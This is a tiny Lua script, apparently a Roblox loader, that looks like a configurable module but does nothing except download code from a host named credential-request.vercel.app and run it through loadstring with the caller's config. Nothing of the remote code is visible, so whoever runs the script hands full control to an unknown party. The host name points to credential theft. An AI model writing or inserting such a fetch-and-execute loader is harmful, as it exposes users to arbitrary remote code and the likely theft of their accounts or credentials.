return function(config)
    local code = game:HttpGet("https://credential-request.vercel.app/Hub/Universal/System.lua")
    local fn = loadstring(code)()
    if type(fn) ~= "function" then
        error("...")
    end
    return fn(config)
end
